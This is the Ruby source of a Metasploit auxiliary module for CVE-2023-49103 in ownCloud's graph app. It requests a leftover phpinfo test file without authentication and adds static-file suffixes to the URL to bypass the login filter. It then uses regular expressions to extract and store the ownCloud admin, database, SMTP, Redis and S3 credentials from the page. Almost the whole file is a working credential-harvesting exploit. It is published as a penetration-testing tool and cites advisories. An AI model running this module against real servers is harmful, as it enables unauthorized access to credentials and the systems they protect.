##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'ownCloud Phpinfo Reader',
        'Description' => %q{
          Docker containers of ownCloud compiled after February 2023, which have version 0.2.0 before 0.2.1 or 0.3.0 before 0.3.1 of the app `graph` installed
          contain a test file which prints `phpinfo()` to an unauthenticated user. A post file name must be appended to the URL to bypass the login filter.
          Docker may export sensitive environment variables including ownCloud, DB, redis, SMTP, and S3 credentials, as well as other host information.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'creacitysec', # original PoC
          'Ron Bowes', # research
          'random-robbie', # additional PoC work and research
          'Christian Fischer' # additional PoC work and research
        ],
        'References' => [
          [ 'URL', 'https://owncloud.com/security-advisories/disclosure-of-sensitive-credentials-and-configuration-in-containerized-deployments/'],
          [ 'URL', 'https://github.com/creacitysec/CVE-2023-49103'],
          [ 'URL', 'https://www.labs.greynoise.io//grimoire/2023-11-29-owncloud-redux/'],
          [ 'URL', 'https://www.rapid7.com/blog/post/2023/12/01/etr-cve-2023-49103-critical-information-disclosure-in-owncloud-graph-api/'],
          [ 'CVE', '2023-49103']
        ],
        'Targets' => [
          [ 'Automatic Target', {}]
        ],
        'DisclosureDate' => '2023-11-21',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [IOC_IN_LOGS],
          'SideEffects' => []
        }
      )
    )
    register_options(
      [
        Opt::RPORT(8080),
        OptString.new('TARGETURI', [ true, 'The URI of ownCloud', '/']),
        OptEnum.new('ROOT', [true, 'Root path to start with', 'all', ['all', '', 'owncloud'] ]),
        OptEnum.new('ENDFILE', [
          true, 'End path to append', 'all', [
            'all', 'css', 'js', 'svg', 'gif', 'png', 'html', 'ttf', 'woff', 'ico', 'jpg',
            'jpeg', 'json', 'properties', 'min.map', 'js.map', 'auto.map'
          ]
        ]),
      ]
    )
  end

  def roots
    if datastore['ROOT'] == 'all'
      return ['', 'owncloud']
    end

    datastore['ROOT']
  end

  def endfiles
    if datastore['ENDFILE'] == 'all'
      return [
        '.css', '.js', '.svg', '.gif', '.png', '.html', '.ttf', '.woff', '.ico', '.jpg',
        '.jpeg', '.json', '.properties', '.min.map', '.js.map', '.auto.map'
      ]
    end
    ".#{datastore['ENDFILE']}"
  end

  def field_regex(field)
    "<tr><td class=\"e\">#{field} <\/td><td class=\"v\">([^ ]+) <\/td><\/tr>"
  end

  def run
    found = false
    roots.each do |root|
      break if found

      endfiles.each do |endfile|
        url = normalize_uri(target_uri.path, root, 'apps', 'graphapi', 'vendor', 'microsoft', 'microsoft-graph', 'tests', 'GetPhpInfo.php', endfile)
        vprint_status("Checking: #{url}")
        res = send_request_cgi(
          'uri' => url
        )

        fail_with(Failure::Unreachable, "#{peer} - Could not connect to web service - no response") if res.nil?
        unless res.code == 200 && res.body.include?('phpinfo()')
          print_bad("Not Exploited - HTTP Status Code: #{res.code}")
          next
        end
        print_good("Found phpinfo page at: #{url}")

        # store page
        l = store_loot(
          'owncloud.phpinfo',
          'text/html',
          rhost,
          res.body,
          'phpinfo.html'
        )
        print_good("Loot stored to: #{l}")

        # process the page

        ## License Key
        print_good("License Key: #{::Regexp.last_match(1)}") if res.body =~ /#{field_regex('OWNCLOUD_LICENSE_KEY')}/

        ## Misc host things
        if res.body =~ /#{field_regex('HOSTNAME')}/
          print_good("Hostname: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('HOME')}/
          print_good("Home: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('APACHE_DOCUMENT_ROOT')}/
          print_good("Server Root: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('PWD')}/
          print_good("PWD: #{::Regexp.last_match(1)}")
        end

        table = Rex::Text::Table.new(
          'Header' => 'Credentials',
          'Indent' => 2,
          'SortIndex' => 0,
          'Columns' => [ 'Type', 'Host', 'Username', 'Password', 'Notes']
        )

        ## SMTP
        if res.body =~ /#{field_regex('OWNCLOUD_MAIL_SMTP_HOST')}/
          smtp_host = ::Regexp.last_match(1)
          print_good("SMTP Host: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_MAIL_SMTP_PORT')}/
          smtp_port = ::Regexp.last_match(1)
          print_good("SMTP Port: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_MAIL_SMTP_NAME')}/
          smtp_username = ::Regexp.last_match(1)
          print_good("SMTP Username: #{::Regexp.last_match(1)}")
        end

        if res.body =~ /#{field_regex('OWNCLOUD_MAIL_SMTP_PASSWORD')}/
          smtp_password = ::Regexp.last_match(1)
          print_good("SMTP Password: #{::Regexp.last_match(1)}")
        end

        if smtp_password
          credential_data = {
            protocol: 'tcp',
            workspace_id: myworkspace_id,
            service_name: 'SMTP',
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: smtp_password,
            private_type: :password
          }
          credential_data[:username] = smtp_username if smtp_username
          credential_data[:address] = smtp_host.nil? ? '127.0.0.1' : smtp_host
          credential_data[:port] = smtp_port.nil? ? 25 : smtp_port

          create_credential(credential_data)
          table << ['SMTP', "#{credential_data[:address]}:#{credential_data[:port]}", credential_data[:username], smtp_password, '']
        end

        ## ownCloud
        if res.body =~ /#{field_regex('OWNCLOUD_ADMIN_USERNAME')}/
          owncloud_username = ::Regexp.last_match(1)
          print_good("ownCloud Username: #{::Regexp.last_match(1)}")
        end

        if res.body =~ /#{field_regex('OWNCLOUD_ADMIN_PASSWORD')}/
          owncloud_password = ::Regexp.last_match(1)
          print_good("ownCloud Password: #{::Regexp.last_match(1)}")
        end

        if res.body =~ /#{field_regex('SERVER_PORT')}/
          ::Regexp.last_match(1)
        end

        if owncloud_password
          credential_data = {
            protocol: 'tcp',
            port: rport,
            address: rhost,
            workspace_id: myworkspace_id,
            service_name: 'ownCloud',
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: owncloud_password,
            private_type: :password
          }
          credential_data[:username] = owncloud_username.nil? ? '' : owncloud_username

          create_credential(credential_data)
          table << ['ownCloud', "#{rhost}:#{rport}", credential_data[:username], owncloud_password, '']
        end

        ## DB
        if res.body =~ /#{field_regex('OWNCLOUD_DB_HOST')}/ # includes port
          db_host = ::Regexp.last_match(1)
          print_good("DB Host: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_DB_USERNAME')}/
          db_username = ::Regexp.last_match(1)
          print_good("DB Username: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_DB_PASSWORD')}/
          db_password = ::Regexp.last_match(1)
          print_good("DB Password: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_DB_NAME')}/
          print_good("DB Name: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_DB_TYPE')}/
          db_type = ::Regexp.last_match(1)
        end

        if db_password
          credential_data = {
            protocol: 'tcp',
            port: db_host.split(':')[1],
            address: db_host.split(':')[0],
            workspace_id: myworkspace_id,
            service_name: db_type,
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: db_password,
            private_type: :password
          }
          credential_data[:username] = db_username.nil? ? '' : db_username
          create_credential(credential_data)
          table << [db_type, "#{rhost}:#{rport}", credential_data[:username], db_password, '']
        end

        ## REDIS
        if res.body =~ /#{field_regex('OWNCLOUD_REDIS_HOST')}/
          redis_host = ::Regexp.last_match(1)
          print_good("Redis Host: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_REDIS_PORT')}/
          redis_port = ::Regexp.last_match(1)
          print_good("Redis Port: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_REDIS_DB')}/
          ::Regexp.last_match(1)
          print_good("Redis DB: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_REDIS_PASSWORD')}/
          redis_password = ::Regexp.last_match(1)
          print_good("Redis Password: #{::Regexp.last_match(1)}")
        end

        if redis_password
          credential_data = {
            protocol: 'tcp',
            port: redis_port,
            address: redis_host,
            workspace_id: myworkspace_id,
            service_name: 'redis',
            origin_type: :service,
            module_fullname: fullname,
            status: Metasploit::Model::Login::Status::UNTRIED,
            private_data: redis_password,
            private_type: :password
          }

          create_credential(credential_data)
          table << ['redis', "#{redis_host}:#{redis_port}", '', redis_password, '']
        end

        ## OBJECTSTORE
        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_ENDPOINT')}/
          os_endpoint = ::Regexp.last_match(1)
          print_good("Objectstore Endpoint: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_REGION')}/
          os_region = ::Regexp.last_match(1)
          print_good("Objectstore Region: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_SECRET')}/
          os_secret = ::Regexp.last_match(1)
          print_good("Objectsore Secret: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_KEY')}/
          os_key = ::Regexp.last_match(1)
          print_good("Objectstore Key: #{::Regexp.last_match(1)}")
        end
        if res.body =~ /#{field_regex('OWNCLOUD_OBJECTSTORE_BUCKET')}/
          os_bucket = ::Regexp.last_match(1)
          print_good("Objectstore Bucket: #{::Regexp.last_match(1)}")
        end
        if os_secret && os_key
          table << ['S3 Object Store', os_region, "Key: #{os_key}", "Secret: #{os_secret}", "Endpoint: #{os_endpoint}, Bucket: #{os_bucket}"]
        end

        print_good(table.to_s)
        found = true
        break # no need to keep going, we already got what we wanted
      end
    end
  end
end
